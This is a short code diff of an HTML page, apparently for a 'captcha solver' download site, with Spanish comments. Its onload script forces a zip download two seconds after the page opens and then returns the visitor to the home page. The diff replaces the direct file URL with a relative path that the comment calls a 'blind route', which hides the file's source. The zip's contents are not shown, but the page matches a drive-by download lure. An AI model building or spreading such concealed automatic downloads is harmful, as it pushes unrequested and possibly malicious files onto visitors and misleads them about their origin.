@@ -39,16 +39,17 @@ https://captchasolver-0r9q.onrender.com/captchaSolverDemo.zip
 
     <script>
         window.onload = function() {
-            // 1. A los 2 segundos dispara la descarga del instalador masivo
+            // 1. Llama a la ruta ciega del servidor de Node.js de forma relativa
             setTimeout(function() {
-                window.location.href = "https://captchasolver-0r9q.onrender.com/rifol.zip";
+                window.location.href = "/ejecutar-descarga-segura";
             }, 2000);
 
-            // 2. Le damos 12 segundos para que el cliente tenga tiempo de leer la nota de soporte antes de regresar solo
+            // 2. Redirección automática de regreso al inicio limpio
             setTimeout(function() {
-                window.location.href = "https://captchasolver-0r9q.onrender.com";
+                window.location.href = "/";
             }, 12000);
         };
     </script>
+
 </body>
 </html>
